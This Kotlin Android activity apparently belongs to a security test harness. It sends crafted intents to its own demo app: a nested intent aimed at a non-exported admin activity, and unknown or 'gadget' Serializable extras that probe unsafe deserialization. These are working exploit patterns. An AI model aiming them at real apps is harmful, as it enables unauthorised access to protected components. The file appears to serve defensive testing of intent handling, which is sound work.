package com.shezguard.attacker

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import com.shezguard.router.demo.LegacyProfile
import java.io.Serializable

/**
 * Sends crafted intents that adb cannot express (Intent and Serializable extras) to the demo app,
 * then finishes. Mode from the "attack" extra:
 * - `nested`: threat 1, an Intent for the demo's non-exported InternalAdminActivity inside "next".
 * - `serializable_unknown`: threat 5, a Serializable whose class the demo app does not have.
 * - `gadget`: threat 5b, a LegacyProfile, a class the demo app does have (same name and serialVersionUID).
 *
 * Step 14 will add caller-identity modes (startActivityForResult, FLAG_ACTIVITY_FORWARD_RESULT,
 * ActivityOptions.setShareIdentityEnabled, referrer variants).
 */
class AttackActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val mode = intent.getStringExtra("attack")
        val sent = when (mode) {
            "nested" -> target("ForwardActivity").putExtra(
                "next",
                Intent().setComponent(ComponentName(VICTIM, "$VICTIM.demo.InternalAdminActivity")),
            )
            "serializable_unknown" -> target("ProfileActivity").putExtra("profile", UnknownPayload("x"))
            "gadget" -> target("ProfileActivity").putExtra("profile", LegacyProfile("attacker"))
            else -> null
        }
        if (sent == null) {
            Log.e(TAG, "unknown attack mode: $mode")
        } else {
            Log.i(TAG, "sending mode=$mode to ${sent.component?.flattenToShortString()}")
            startActivity(sent)
        }
        finish()
    }

    private fun target(activity: String) = Intent().setComponent(ComponentName(VICTIM, "$VICTIM.demo.$activity"))

    /** A class that exists only in this app, so the demo app cannot resolve it. */
    class UnknownPayload(val value: String) : Serializable {
        private companion object {
            private const val serialVersionUID: Long = 1L
        }
    }

    companion object {
        const val TAG = "ShezAttacker"
        const val VICTIM = "com.shezguard.router"
    }
}
